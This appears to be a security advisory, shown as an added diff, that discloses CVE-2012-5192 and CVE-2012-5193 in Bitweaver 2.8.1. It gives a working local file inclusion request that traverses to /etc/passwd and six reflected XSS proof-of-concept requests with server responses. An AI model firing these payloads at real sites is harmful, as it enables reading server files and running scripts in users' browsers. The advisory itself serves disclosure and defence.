@@ -1,0 +1,164 @@
+Finding 1: Local File Inclusion Vulnerability
+CVE: CVE-2012-5192
+ 
+The 'overlay_type' parameter in the 'gmap/view_overlay.php' page in
+Bitweaver is vulnerable to a local file inclusion vulnerability.
+ 
+This vulnerability can be demonstrated by traversing to a known readable
+path on the web server file system.
+ 
+Example:
+ 
+Performing LFI on 'overlay_type' parameter
+ 
+#Request
+ 
+http://www.example.com/bitweaver/gmap/view_overlay.php?overlay_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd%00
+ 
+#Response
+ 
+root:x:0:0:root:/root:/bin/bash
+<snip>
+ 
+Finding 2: Multiple XSS Vulnerabilities in Bitweaver
+CVE: CVE-2012-5193
+ 
+Multiple cross-site scripting (XSS) vulnerabilities have been discovered
+that allow remote unauthenticated users to run arbitrary scripts on the
+system.
+ 
+Example:
+ 
+The following Proof of Concepts illustrate that Bitweaver 2.8.1 is
+vulnerable to XSS.
+ 
+Example(s):
+ 
+1. Performing XSS on stats/index.php
+ 
+#Request
+ 
+GET /bitweaver/stats/index.php/%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E HTTP/1.0
+ 
+#Response
+ 
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:42:34 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=4gmfnd86ahtvn34v5oejgivvh3; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+[truncated due to length]
+ 
+2. Performing XSS on /newsletters/edition.php
+ 
+#Request
+ 
+GET /bitweaver/newsletters/edition.php/%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E HTTP/1.0
+ 
+#Response
+ 
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:42:02 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=ajdjp797r7atral75rmlhcgs63; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+[truncated due to length]
+ 
+3. Performing XSS on the 'username' parameter available on /users/
+ 
+#Request
+ 
+POST /bitweaver/users/remind_password.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+ 
+username=%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E&remind=Reset+%28password%29
+ 
+#Response
+ 
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:53:11 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=i0ktqmt3497thag552t9ds78v4; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html; charset=utf-8
+Content-Length: 15974
+[truncated due to length]
+ 
+<snip>
+Invalid or unknown username: ">alert('XSS');</p></div>Please follow the instructions in the email.
+<snip>
+ 
+4. Performing XSS on the 'days' parameter on /stats/index.php
+ 
+#Request
+ 
+POST /bitweaver/stats/index.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 177
+ 
+days=%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E&pv_chart=Display
+ 
+#Response
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:55:53 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=dqdvcnmql8jhngp0tphseh1qh4; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html; charset=utf-8
+Content-Length: 24778
+[truncated due to length]
+ 
+<snip>
+<img src="/stats/pv_chart.php?days="><script>alert('XSS');</script>" alt="Site Usage Statistics" />
+<snip>
+ 
+5. Performing XSS on the 'login' parameter on /users/register.php. (try
+entering "><IFRAME src="https://www.trustwave.com" height="1000px"
+width="1000px"> into the "Username field"):
+ 
+http://www.example.com/bitweaver/users/register.php
+ 
+ 
+6. Performing XSS on the 'highlight' parameter:
+ 
+#Request
+ 
+GET /bitweaver/?highlight=%2522%253E%253Cscript%253Ealert('XSS')%253B%253C%252Fscript%253E HTTP/1.0
+ 
+#Response
+ 
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:59:09 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=ama93jqlojmi385plkft5opl64; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+
